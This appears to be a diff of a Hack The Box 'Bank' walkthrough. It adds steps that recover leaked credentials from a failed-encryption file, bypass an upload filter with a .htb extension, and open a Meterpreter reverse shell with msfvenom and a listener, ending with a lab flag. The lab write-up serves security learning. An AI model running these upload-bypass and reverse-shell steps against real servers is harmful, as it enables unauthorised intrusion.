@@ -17,6 +17,8 @@
 
 ### 7. Further Enumeration with Dirbuster Again
 
+### 8. Exploitating Unencrypted Credentials
+
 # Attack
 ## 1. NMAP
 This machine sounds fun. Let's go.
@@ -414,24 +416,35 @@ http://bank.htb/balance-transfer
 [ ]	0b45913c924082d2c88a804a643a29c8.acc	2017-06-15 09:50 	584 	 
 [ ]	0be866bee5b0b4cff0e5beeaa5605b2e.acc	2017-06-15 09:50 	584 	 
 [ ]	0c04ca2346c45c28ecededb1cf62de4b.acc	2017-06-15 09:50 	585 	 
-[ ]	0c4c9639defcfe73f6ce86a17f830ec0.acc	2017-06-15 09:50 	584 	 
-[ ]	0ce1e50b4ee89c75489bd5e3ed54e003.acc	2017-06-15 09:50 	584 	 
-[ ]	0d3d24f24126789503b03d14c0467657.acc	2017-06-15 09:50 	584 	 
-[ ]	0d64f03e84187359907569a43c83bddc.acc	2017-06-15 09:50 	582 	 
-[ ]	0d76fac96613294c341261bd87ddcf33.acc	2017-06-15 09:50 	584 	 
-[ ]	0e5a884b0b23e98446c460b4dbafc3ee.acc	2017-06-15 09:50 	584 	 
-[ ]	0ec03beb3832b05908105342c0cc9b2f.acc	2017-06-15 09:50 	584 	 
-...	 
-[ ]	fabfd4cd599ac63c5699f456f2cf448e.acc	2017-06-15 09:50 	584 	 
-[ ]	fb3cb6734c832b14987f002c2dadae19.acc	2017-06-15 09:50 	585 	 
-[ ]	fb5a9d6ac0d2c781dffd73c470f23fe0.acc	2017-06-15 09:50 	583 	 
-[ ]	fb42d07220a996307df38ec7e6189b4c.acc	2017-06-15 09:50 	584 	 
-[ ]	fb73bed60d6dd4559860ea5f7f2f5a3c.acc	2017-06-15 09:50 	584 	 
-[ ]	fb891061321669dd0ef9d5114d476f3a.acc	2017-06-15 09:50 	585 	 
-[ ]	fbcbbd213f0a3e88ee84eea9a9d01b90.acc	2017-06-15 09:50 	584 	 
-[ ]	fc6cdd24cf81d66d12c97aa97a37fe33.acc	2017-06-15 09:50 	584 	 
-[ ]	fc87e5f87f8d7a8eedc4ee85b5b1c58e.acc	2017-06-15 09:50 	583 	 
-[ ]	fc73548dc690c238c5aff9cb9e440498.acc	2017-06-15 09:50 	584 	 
+[ ]	0c4c9639defcfe73f6ce86a17f830ec0.acc	2017-06-15 09:50 	584 	  
+... 
+[ ]	39095d3e086eb29355d37ed5d19a9ed0.acc	2017-06-15 09:50 	583 	 
+[ ]	42261debb6bdfc4d709d424616bc18cc.acc	2017-06-15 09:50 	583 	 
+[ ]	44987d36fe627d12501b25116c242318.acc	2017-06-15 09:50 	584 	 
+[ ]	45028a24c0a30864f94db632bca0a351.acc	2017-06-15 09:50 	585 	 
+[ ]	47171c38422e049e50532e6606fa932d.acc	2017-06-15 09:50 	584 	 
+[ ]	49206d1e18aa8eb1c64dae4741639b2f.acc	2017-06-15 09:50 	585 	 
+[ ]	50276beac1f014b64b19dbd0e7c6bb1a.acc	2017-06-15 09:50 	584 	 
+[ ]	54656a84fec49d5da07f25ee36b298bd.acc	2017-06-15 09:50 	584 	 
+[ ]	56215edb6917e27802904037da00a977.acc	2017-06-15 09:50 	584 	 
+[ ]	59829e0910101366d704a85f11cfdd15.acc	2017-06-15 09:50 	584 	 
+[ ]	66284d79b5caa9e6a3dd440607b3fdd7.acc	2017-06-15 09:50 	584 	 
+[ ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50 	257 	 
+[ ]	75942bd27ec22afd9bdc8826cc454c75.acc	2017-06-15 09:50 	584 	 
+[ ]	76123b5b589514bc2cb1c6adfb937d13.acc	2017-06-15 09:50 	584 	 
+[ ]	80416d8aaea6d6cf3dcec95780fda17d.acc	2017-06-15 09:50 	585 	 
+[ ]	85006f1266226e84efb919908d5f8333.acc	2017-06-15 09:50 	583 	 
+[ ]	87831b753b8530fddc74e73ca8515a50.acc	2017-06-15 09:50 	585 	 
+[ ]	91249b887c7bf3f6cb7becc0c0ab8ddd.acc	2017-06-15 09:50 	584 	 
+[ ]	94290d34dec7593ce7c5632150a063d2.acc	2017-06-15 09:50 	585 	 
+[ ]	301120b456a3b5981f5cdc9d484f1b3b.acc	2017-06-15 09:50 	585 	 
+[ ]	430547d637347d0da78509b774bb9fdf.acc	2017-06-15 09:50 	584 	 
+[ ]	453500e8ebb7e50f098068d998db0090.acc	2017-06-15 09:50 	583 	 
+[ ]	632416bbd8eb4a3480297ea3875ea568.acc	2017-06-15 09:50 	584 	 
+[ ]	640087eae263bd45eb444767ead7dd65.acc	2017-06-15 09:50 	585 	 
+[ ]	756431ad587f462168df5064b3b829a8.acc	2017-06-15 09:50 	584 	 
+[ ]	874792fab530aed50b38b26f2a8c1870.acc	2017-06-15 09:50 	584
+...
 [ ]	fcb78e263fc7d6e296494e5be897a394.acc	2017-06-15 09:50 	584 	 
 [ ]	fdce9437d341e154702af5863bc247a8.acc	2017-06-15 09:50 	585 	 
 [ ]	fe8a8b0081b6d606d6e85501064f1cc4.acc	2017-06-15 09:50 	585 	 
@@ -468,3 +481,146 @@ Balance: 905948 .
 ```
 Now, this is interesting. Encrypted credentials.
 
+## 8. Exploitating Unencrypted Credentials
+I got lost here yet again, and had to look up for writeups again.
+
+Turns out, one of these files is not like the other. Instead of having a size of either 583 or 584, it is much smaller and has a size of 257 due to failed encryption.
+```
+[ ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50 	257 	 
+
+http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
+
+--ERR ENCRYPT FAILED
++=================+
+| HTB Bank Report |
++=================+
+
+===UserAccount===
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: !##HTBB4nkP4ssw0rd!##
+CreditCards: 5
+Transactions: 39
+Balance: 8842803 .
+===UserAccount===
+```
+We shall use these credentials to log in to `http://bank.htb/login.php`.
+
+Upon logging in successfully, we can see his balance, transactions, and credit cards. More importantly, we are able to see a Support page which we can upload files. However, since we were unable to access `http://bank.htb/uploads/`, it'd be useless since we would not be able to execute our payload.
+
+Yet again, I am lost since this is the first exercise where we do not use known exploits.
+
+## 9. PHP Payload
+The clue was to look at the page source of the support page.
+```
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>HTB Bank - Support</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Bootstrap -->
+    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
+    <!-- styles -->
+    <link href="./assets/css/theme/styles.css" rel="stylesheet">
+    <!-- SweetAlert -->
+    <link rel="stylesheet" type="text/css" href="./assets/css/sweetalert.css">
+  </head>
+  <body>
+...
+
+        <div class="panel-body">
+            <form class="new_ticket" id="new_ticket" accept-charset="UTF-8" method="post" enctype="multipart/form-data">
+
+                <label>Title</label>
+                <input required placeholder="Title" class="form-control" type="text" name="title" id="ticket_title" style="background-repeat: repeat; background-image: none; background-position: 0% 0%;">
+                <br>
+
+                <label>Message</label>
+                <textarea required placeholder="Tell us your problem" class="form-control" style="height: 170px; background-repeat: repeat; background-image: none; background-position: 0% 0%;" name="message" id="ticket_message"></textarea>
+                <br>
+                <div style="position:relative;">
+                		<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
+				        <a class='btn btn-primary' href='javascript:;'>
+				            Choose File...
+				            <input type="file" required style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="fileToUpload" size="40"  onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>
+				        </a>
+				        &nbsp;
+				        <span class='label label-info' id="upload-file-info"></span>
+...
+    <!-- Morris Charts JavaScript -->
+    <script src="./assets/js/plugins/morris/raphael.min.js"></script>
+    <script src="./assets/js/plugins/morris/morris.min.js"></script>
+    <script src="./assets/js/plugins/morris/morris-data.js"></script>
+
+    <!-- SweetAlert -->
+    <script src="./assets/js/sweetalert.min.js"></script>
+
+</body>
+
+</html>
+```
+We spot an interesting comment that the Developer failed to remove! `<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->`, & `onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>`. This just confirms that we could possibly go to a path and execute our PHP payload.
+
+Let's use msfvenom to craft a PHP reverse shell!
+```
+hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=6969 -f raw > shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 30687 bytes
+```
+And we go back to our Support page, attaching our `shell.php` PHP reverse shell and submitting it. Unfortunately it returned with the error "You cant upload this file. You can upload only images.". If we read the Developer's comments carefully, we realise that the file extension `.htb` is supported instead for debugging purposes.
+
+Let's use msfvenom again to craft a PHP reverse shell, but using a HTB wrapper.
+```
+hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=6969 -f raw > shell.htb
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 30687 bytes
+```
+This time, we try uploading our `shell.htb` PHP reverse shell and it worked, with the message "Your ticket has been created successfully".
+
+We now start a Meterpreter listener, and try to execute this payload which will most likely be on `http://bank.htb/uploads/` as we've seen from our Gobuster earlier.
+```
+msf5 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf5 exploit(multi/handler) > show options
+...
+msf5 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.19:6969 
+```
+All that is left is to execute our shell, by navigating to `http://bank.htb/uploads/shell.htb`.
+```
+[*] Started reverse TCP handler on 10.10.14.19:6969 
+[*] Meterpreter session 1 opened (10.10.14.19:6969 -> 10.129.29.200:57404) at 2021-01-31 21:19:13 +0800
+
+meterpreter > getuid
+Server username: www-data (33)
+```
+This worked! We got a Meterpreter shell successfully.
+
+## 10. Privilege Escalation & Getting Flags
+Through navigating around, we got our first flag.
+```
+meterpreter > cd chris
+meterpreter > ls
+Listing: /home/chris
+====================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+20666/rw-rw-rw-   0     cha   2021-01-31 19:56:54 +0800  .bash_history
+100644/rw-r--r--  220   fil   2017-05-29 03:13:11 +0800  .bash_logout
+100644/rw-r--r--  3637  fil   2017-05-29 03:13:11 +0800  .bashrc
+40700/rwx------   4096  dir   2021-01-11 20:19:00 +0800  .cache
+100644/rw-r--r--  675   fil   2017-05-29 03:13:11 +0800  .profile
+100444/r--r--r--  33    fil   2021-01-31 19:57:12 +0800  user.txt
+
+meterpreter > cat user.txt
+cf7e86220606b30342777eca247d9272
+```
